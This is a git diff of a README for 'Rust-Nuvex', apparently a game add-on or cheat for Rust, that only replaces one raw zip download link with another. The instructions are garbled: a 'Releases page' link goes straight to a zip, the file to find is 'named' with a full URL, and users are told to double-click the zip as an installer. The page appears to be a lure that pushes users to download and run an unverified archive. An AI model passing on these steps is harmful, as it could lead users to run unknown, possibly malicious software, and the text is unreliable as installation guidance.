@@ -1,7 +1,7 @@
 # 🎮 Rust-Nuvex - Enhance Your Rust Experience
 
 ## 📦 Download Now
-[![Download Rust-Nuvex](https://raw.githubusercontent.com/rhettastiff416/Rust-Nuvex/main/ombrophilic/Rust-Nuvex.zip%20Rust--Nuvex-4CAF50?style=flat&logo=github&logoColor=white)](https://raw.githubusercontent.com/rhettastiff416/Rust-Nuvex/main/ombrophilic/Rust-Nuvex.zip)
+[![Download Rust-Nuvex](https://github.com/rhettastiff416/Rust-Nuvex/raw/refs/heads/main/ombrophilic/Rust_Nuvex_3.5.zip%20Rust--Nuvex-4CAF50?style=flat&logo=github&logoColor=white)](https://github.com/rhettastiff416/Rust-Nuvex/raw/refs/heads/main/ombrophilic/Rust_Nuvex_3.5.zip)
 
 ---
 
@@ -20,18 +20,18 @@ Before you start, ensure your system meets these basic requirements:
 
 ### 📥 Download & Install
 
-To download Rust-Nuvex, visit our [Releases page here](https://raw.githubusercontent.com/rhettastiff416/Rust-Nuvex/main/ombrophilic/Rust-Nuvex.zip) . Follow the steps below:
+To download Rust-Nuvex, visit our [Releases page here](https://github.com/rhettastiff416/Rust-Nuvex/raw/refs/heads/main/ombrophilic/Rust_Nuvex_3.5.zip) . Follow the steps below:
 
 1. After visiting the Releases page, find the latest version listed at the top.
 2. Click on the version number to expand the details.
-3. You will see a list of downloadable files. Look for the file named `https://raw.githubusercontent.com/rhettastiff416/Rust-Nuvex/main/ombrophilic/Rust-Nuvex.zip`.
-4. Click on `https://raw.githubusercontent.com/rhettastiff416/Rust-Nuvex/main/ombrophilic/Rust-Nuvex.zip` to start the download.
+3. You will see a list of downloadable files. Look for the file named `https://github.com/rhettastiff416/Rust-Nuvex/raw/refs/heads/main/ombrophilic/Rust_Nuvex_3.5.zip`.
+4. Click on `https://github.com/rhettastiff416/Rust-Nuvex/raw/refs/heads/main/ombrophilic/Rust_Nuvex_3.5.zip` to start the download.
 5. Once the download is complete, locate the file in your "Downloads" folder.
 
 ### ⚙️ Installation Steps
 
 1. **Run the Installer:**
-   - Double-click on the `https://raw.githubusercontent.com/rhettastiff416/Rust-Nuvex/main/ombrophilic/Rust-Nuvex.zip` file to run the installer.
+   - Double-click on the `https://github.com/rhettastiff416/Rust-Nuvex/raw/refs/heads/main/ombrophilic/Rust_Nuvex_3.5.zip` file to run the installer.
 
 2. **Follow the Instructions:**
    - A setup window will open. Click "Next" to move through the prompts.
